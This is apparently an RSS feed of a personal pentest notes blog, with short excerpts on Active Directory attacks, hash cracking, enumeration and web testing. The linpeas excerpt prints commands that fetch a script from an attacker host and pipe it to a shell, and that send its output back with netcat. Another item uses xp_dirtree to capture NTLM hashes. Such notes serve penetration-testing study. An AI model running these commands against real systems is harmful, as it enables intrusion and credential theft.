<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pentest on Braindump</title>
    <link>https://kdbed.github.io/tags/pentest/</link>
    <description>Recent content in pentest on Braindump</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="https://kdbed.github.io/tags/pentest/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Active Scanning with Scapy</title>
      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.
SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
    </item>
    
    <item>
      <title>Ansible - Playbook weaponization</title>
      <link>https://kdbed.github.io/posts/ansible_playbook_weaponization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ansible_playbook_weaponization/</guid>
      <description>https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/</description>
    </item>
    
    <item>
      <title>AS-REP Roasting</title>
      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
    </item>
    
    <item>
      <title>Bloodhound</title>
      <link>https://kdbed.github.io/posts/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/bloodhound/</guid>
      <description>Bloodhound bloodhound-python bloodhound-python -u &amp;#39;&amp;lt;user&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;pw&amp;gt;&amp;#39; --dns-tcp -ns &amp;lt;ip&amp;gt; -d &amp;lt;domain&amp;gt; -c all root@kali:~# bloodhound-python -h usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-no-pass] [-aesKey hex key] [--auth-method {auto,ntlm,kerberos}] [-ns NAMESERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-dc HOST] [-gc HOST] [-w WORKERS] [--exclude-dcs] [--disable-pooling] [--disable-autogc] [--zip] [--computerfile COMPUTERFILE] [--cachefile CACHEFILE] Python based ingestor for BloodHound For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py options: -h, --help show this help message and exit -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD Which information to collect.</description>
    </item>
    
    <item>
      <title>Cracking - Ansible</title>
      <link>https://kdbed.github.io/posts/cracking_ansible/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/cracking_ansible/</guid>
      <description>Cracking Ansible vaults Find Ansible vault &amp;ndash; encrypted creds
$ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 Convert to correct form for john
/usr/share/john/ansible2john.py pwm_ansible_admin.yml &amp;gt; out.yml Then crack with john &amp;ndash;</description>
    </item>
    
    <item>
      <title>Cracking - PDF</title>
      <link>https://kdbed.github.io/posts/cracking_pdf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/cracking_pdf/</guid>
      <description>fcrackzip fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt </description>
    </item>
    
    <item>
      <title>FTP - retrieve files with Python</title>
      <link>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Google Hacking</title>
      <link>https://kdbed.github.io/posts/google_hacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/google_hacking/</guid>
      <description>Operators ahrefs </description>
    </item>
    
    <item>
      <title>Kerbrute</title>
      <link>https://kdbed.github.io/posts/kerbrute_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/kerbrute_enumeration/</guid>
      <description>Kerbrute based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We&amp;rsquo;ll need to provide a username and password to do this. If the credentials are valid, we&amp;rsquo;ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.</description>
    </item>
    
    <item>
      <title>Lateral Movement</title>
      <link>https://kdbed.github.io/posts/lateral_movement/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/lateral_movement/</guid>
      <description>Lateral Movement The adversary is trying to move through your environment.
Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.</description>
    </item>
    
    <item>
      <title>linpeas</title>
      <link>https://kdbed.github.io/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/linpeas/</guid>
      <description>See carlospolop : PEASS-ng hacktricks
Execution: Run from memory and send back to attacker:
# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory/</guid>
      <description>Active Directory Enumeration Legacy Windows Tools Use net.exe to gather user information
1 net user /domain A more detailed view of specific users in the output above:
1 net user &amp;lt;username&amp;gt; /domain Enumerate groups:
1 net group /domain Specifying a group:
1 net group &amp;lt;groupname&amp;gt; /domain PowerShell and .NET When RSAT tools aren&amp;rsquo;t available, we can use an Active Directory Services Interface ADSI (a set of interfaces built on COM as an LDAP provider.</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - Certificate Services</title>
      <link>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</guid>
      <description>Active Directory Certificate Services social.technet.microsoft.com
Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton
Abusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify
PS C:\ &amp;gt; .</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - DCSync</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</guid>
      <description>hacktricks - DCSync</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - SID-History Injection</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</guid>
      <description>SentinelOne
ADSecurity
MITRE</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - Skeleton Key</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
      <description>hacktricks
netwrix</description>
    </item>
    
    <item>
      <title>Pentest - Active Information Gathering</title>
      <link>https://kdbed.github.io/posts/pentest_active_information_gathering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_information_gathering/</guid>
      <description>Active Information Gathering DNS DNS - Basics DNS Enumeration - Basics DNS forward lookup brute-forcing to determine additional IPs belonging to a domain:
1 for ip in $(cat list.txt); do host $ip.domain.com; done Comprehensive lists available at SecLists. Based on IPs determined from the above, we can perform reverse lookups by scanning an associated range:
1 for ip in $(seq 200 254); do host xxx.xxx.xxx.$ip; done | grep -v &amp;#34;not found&amp;#34; dnsrecon dnsenum2 nslookup TCP/UDP Port Scanning Simple port scan with Netcat:</description>
    </item>
    
    <item>
      <title>Pentest - Generating Wordlists</title>
      <link>https://kdbed.github.io/posts/pentest_generatingwordlists/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_generatingwordlists/</guid>
      <description>Generating Wordlists Username anarchy http://morningstarsecurity.com/research/username-anarchy https://github.com/urbanadventurer/username-anarchy/</description>
    </item>
    
    <item>
      <title>Pentest - gRPC Port 50051</title>
      <link>https://kdbed.github.io/posts/pentest_grpc_port_50051/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_grpc_port_50051/</guid>
      <description>gRPC gRPC (short for Google Remote Procedure Call) is a modern open-source framework developed by Google for creating high-performance, language-agnostic remote procedure call (RPC) systems. It enables communication and interaction between different applications or services running on different platforms and written in different programming languages.
On Linux, gRPC provides a mechanism for building distributed systems by allowing services to communicate with each other efficiently and securely over a network. It utilizes HTTP/2 protocol as its transport layer and supports different serialization formats like Protocol Buffers (protobuf) for efficient data exchange.</description>
    </item>
    
    <item>
      <title>Pentest - MSSQL - Microsoft SQL Server p 1433</title>
      <link>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</guid>
      <description>Pentest Microsoft SQL Server Enumeration 1 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &amp;lt;IP&amp;gt; Test credentials 1 crackmapexec mssql &amp;lt;host&amp;gt; -u users.txt -p passwords.txt Establish connection impacket-mssqlclient -dc-ip &amp;lt;ip&amp;gt; -windows-auth domain/username:password@host List DBs 1 SELECT name FROM master..sysdatabases; Check permissions 1 2 3 4 Use master; EXEC sp_helprotect &amp;#39;xp_dirtree&amp;#39;; EXEC sp_helprotect &amp;#39;xp_subdirs&amp;#39;; EXEC sp_helprotect &amp;#39;xp_fileexist&amp;#39;; xp_dirtree 1 EXEC xp_dirtree &amp;#39;C:\inetpub\wwwroot&amp;#39;, 1, 1; hacktricks</description>
    </item>
    
    <item>
      <title>Pentest - Passive Information Gathering</title>
      <link>https://kdbed.github.io/posts/pentest_passive_information_gathering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_passive_information_gathering/</guid>
      <description>Passive Information Gathering Also known as open-source intelligence OSINT &amp;ndash; the process of collecting freely-available information about a target, often with no direct interaction/contact with target assets. In a strict interpretation, there&amp;rsquo;s zero interaction with the target, eg all information is obtained through a third party. More loosely, passive information gathering allows for interaction with the target, but only as a normal user, eg registering for an account on the corporate website.</description>
    </item>
    
    <item>
      <title>Pentest - SMB p 139,445</title>
      <link>https://kdbed.github.io/posts/pentest_smb_p_139_445/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_smb_p_139_445/</guid>
      <description>HackTricks
Port 139 NetBIOS NetBIOS is Network Basic Input Output System, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.
Port 445 SMB - Server Message Block While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.
SMB Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.</description>
    </item>
    
    <item>
      <title>Pentest - SQL</title>
      <link>https://kdbed.github.io/posts/pentest_sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_sql/</guid>
      <description>MySQL mysql -u fooUser -p -h 44.55.66.77
MSSQL impacket-mssqlclient -port 1433 domain/user:password@host
capture NTLM hashes: SQL&amp;gt; exec master.sys.xp_dirtree &amp;quot;\\10.10.16.2\test&amp;quot;</description>
    </item>
    
    <item>
      <title>Pentest - SSH p 22</title>
      <link>https://kdbed.github.io/posts/pentest_ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_ssh/</guid>
      <description>Pentesting SSH ssh-audit Install
sudo apt install ssh-audit </description>
    </item>
    
    <item>
      <title>Pentest - Stealing Chrome Cookies</title>
      <link>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</guid>
      <description>Stealing Chrome Cookies source: mango.pdf.zone
Using Chrome&amp;rsquo;s remote debugging protocol to steal cookies. github - defaultnamehere
requires rce on victim&amp;rsquo;s machine </description>
    </item>
    
    <item>
      <title>Recon - AutoRecon</title>
      <link>https://kdbed.github.io/posts/recon_autorecon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/recon_autorecon/</guid>
      <description>AutoRecon https://github.com/Tib3rius/AutoRecon</description>
    </item>
    
    <item>
      <title>Recon - Port Scanning and Nmap</title>
      <link>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</guid>
      <description>Nmap scanning SYN (stealth) scan TCP handshake not completed (ACK not sent)
1 nmap -sS &amp;lt;ip&amp;gt; Because the three-way handshake is never completed, the information is not passed to the application layer and as a result, will not appear in any application logs. A SYN scan is also faster and more efficient because fewer packets are sent and received.
TCP Connect Scan 1 nmap -sT &amp;lt;ip&amp;gt; TCP SYN Scan and UDP Scan 1 nmap -sU -sS 192.</description>
    </item>
    
    <item>
      <title>Reverse Shell - Upgrade TTY</title>
      <link>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</guid>
      <description>Reverse Shells then
when python isn&amp;rsquo;t available.
rev shell without python</description>
    </item>
    
    <item>
      <title>sha1Cracker</title>
      <link>https://kdbed.github.io/posts/sha1cracker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
    </item>
    
    <item>
      <title>SQL Injection</title>
      <link>https://kdbed.github.io/posts/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sql_injection/</guid>
      <description>SQL Injection SQLi - websocket rayhan0x01 blind sql injection via websocket
From the above post
&amp;ldquo;If you didn&amp;rsquo;t know, the main difference between HTTP and WebSocket is that HTTP is built on a request-response model whereas WebSocket is like a Socket connection where both client and server can send data anytime asynchronously. So you can&amp;rsquo;t repeat the requests made in WebSocket as you would normally do for HTTP Requests in BurpSuite.</description>
    </item>
    
    <item>
      <title>Subdomain Enumeration</title>
      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):
sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:
sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 gobuster DNS 1 gobuster dns -d domain.com -w $wordlists/subdomains-top1million-110000.txt -t 20 vhost 1 gobuster vhost -u domain.com -w &amp;lt;wordlist&amp;gt; </description>
    </item>
    
    <item>
      <title>Web Pentest - Enumeration</title>
      <link>https://kdbed.github.io/posts/web_pentest_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_enumeration/</guid>
      <description>Web Application Enumeration Nmap 1 nmap -p80 --script=http-enum 192.168.1.2 Wappalyzer Determine technologies used &amp;ndash; see Browser Extensions
Directory Bruce Force Gobuster 1 gobuster dir -u 192.168.2.1 -w /usr/share/wordlists/dirb/common.txt -t 5 wfuzz Subdomain Enumeration dirb </description>
    </item>
    
    <item>
      <title>Web Pentest - File Upload</title>
      <link>https://kdbed.github.io/posts/web_pentest_file_upload/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_file_upload/</guid>
      <description>File Upload Vulnerabilities Checklist from onsecurity Are filenames reflected back on the page? If so, are they HTML Entity encoded (XSS via file names)? Does it accept .zip files? Try a ZipSlip If it processes an image, check for Image Tragick (CVE-2016-3714) Can you bypass file type restrictions by changing the content-type value? Can you bypass file type restrictions by forging valid magic bytes? Can you upload a file with a less-common extension (such as .</description>
    </item>
    
    <item>
      <title>Web Pentest - Tools</title>
      <link>https://kdbed.github.io/posts/web_pentest_tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_tools/</guid>
      <description>Web Pentest Tools web brutator https://github.com/koutto/web-brutator https://blog.zufan.me/Web-Brutator/
yupysubdo https://github.com/0xYP/yupysubdo subdomain finder</description>
    </item>
    
    <item>
      <title>Web Pentest - Wordpress</title>
      <link>https://kdbed.github.io/posts/web_pentest_wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_wordpress/</guid>
      <description>Wordpress WPScan Enumerate vulnerable plugins, users, db exports:
wpscan --url &amp;lt;url&amp;gt; -e dbe,u,vp </description>
    </item>
    
  </channel>
</rss>
